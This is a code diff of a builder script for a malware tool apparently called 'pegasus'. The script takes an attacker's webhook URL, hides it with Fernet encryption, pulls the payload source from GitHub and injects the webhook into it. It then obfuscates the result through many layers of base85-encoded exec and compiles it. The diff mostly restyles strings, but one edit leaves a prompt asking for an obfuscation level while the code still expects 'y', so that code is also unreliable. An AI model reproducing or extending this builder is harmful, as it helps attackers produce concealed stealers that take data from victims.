@@ -26,7 +26,7 @@ __________
         + Style.RESET_ALL
     )
 
-    webhook = input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL)
+    webhook = input(f"{Fore.CYAN}Webhook URL: {Style.RESET_ALL}")
     key = Fernet.generate_key()
     token = Fernet(key).encrypt(bytes(webhook, "utf-8"))
     line_to_inject = f"Fernet({key}).decrypt({token}).decode()"
@@ -34,45 +34,37 @@ __________
     try:
         resp = requests.get(webhook)
         if not resp.ok:
-            print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
+            print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
             exit()
-    except Exception:  # TODO: Clarify exceptions
-        print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
+    except Exception:  # TODO: Clarify exceptions and a couple more
+        print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
         exit()
 
-    filename = input(Fore.CYAN + "Filename: " + Style.RESET_ALL)
+    filename = input(f"{Fore.CYAN}Filename: {Style.RESET_ALL}")
 
     raw = requests.get(
         "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py"
     ).text
 
     print(
-        Fore.YELLOW
-        + f"Creating {filename}.py with '{webhook}' as webhook..."
-        + Style.RESET_ALL
+        f"{Fore.YELLOW}Creating {filename}.py with '{webhook}' as webhook...{Style.RESET_ALL}"
     )
 
     with open(f"{filename}.py", "w", encoding="utf-8") as f:
         f.write(raw.replace('"&WEBHOOK_URL&"', line_to_inject))
 
-    print(Fore.GREEN + "Done!" + Style.RESET_ALL)
+    print(f"{Fore.GREEN}Done!{Style.RESET_ALL}")
 
     level = get_level()
     Obfuscate()
 
-    compile = input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL).lower()
+    compile = input(f"{Fore.CYAN}Obfuscation level (1-30): {Style.RESET_ALL}").lower()
 
     if compile != "y":
         print("I think you said no. Please re-run the script if you said 'yes'")
         return
 
-    input(
-        Fore.RED
-        + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..."
-        + Style.RESET_ALL
-    )
-    print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
-
+    print(f"{Fore.YELLOW}Beginning compilation...{Style.RESET_ALL}")
     # Install requirements
     os.system(r"pip install --upgrade -r .\requirements.txt")
 
@@ -130,17 +122,18 @@ class Obfuscate:
         with open(file, "r", encoding="utf-8") as f:
             lines = [line.rstrip() for line in f]
 
-            for line in lines:
-                if line.startswith("import") or line.startswith("from"):
-                    imports.append(line)
-
+            imports.extend(
+                line
+                for line in lines
+                if line.startswith("import") or line.startswith("from")
+            )
         return imports
 
     def obfuscate(self, code, level):
         obfuscated = f"\nexec(base64.a85decode({base64.a85encode(code.encode('utf-8',errors = 'strict'))}))"
 
         with alive_bar(level) as bar:
-            for e in range(level):
+            for _ in range(level):
                 obfuscated = f"import base64\nexec(base64.a85decode({base64.a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
                 bar()
 
